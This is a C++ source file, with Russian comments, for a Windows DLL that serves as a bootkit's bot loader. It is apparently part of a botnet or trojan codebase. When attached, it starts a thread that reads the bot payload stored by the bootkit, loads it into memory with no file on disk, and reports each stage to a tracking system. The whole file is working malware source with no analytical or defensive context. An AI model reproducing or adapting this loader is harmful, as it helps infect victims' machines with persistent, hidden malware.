#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "BotCore.h"
#include "Crypt.h"
#include "ntdll.h"
#include "BotDebug.h"
#include "DbgRpt.h"
#include "BootkitCrypt.h"
#include "DllLoader.h"

#pragma comment(linker, "/ENTRY:MyDllMain" )

DWORD WINAPI SendLog(LPVOID Data)
{
	const char* s = (char*)Data;
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName(s));
	return 0;
}

DWORD WINAPI StartRunBot(LPVOID Data)
{
//	pSleep( 60 * 1000 );	

	PP_DPRINTF( "StartRunBot" );
	
	DisableShowFatalErrorDialog();

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	RunThread( SendLog, "701_pl" ); //запуск процесса

	DWORD c_data;
	BYTE* data = ReadBotForBootkit(c_data);
	if( data )
	{
		RunThread( SendLog, "702_pl" ); //считали бота
		MemoryLoadLibrary(data);
		MemFree(data);
		DebugReportStepByName("703_pl"); //запустили бот
	}
	return 0;
}

BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			BOT::InitializeApi();
			PP_DPRINTF( "Старт загрузчика бота из буткита" );
			RunThread( StartRunBot, NULL );
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

extern "C"
void WINAPI Start(LPVOID, LPVOID, LPVOID)
{
}
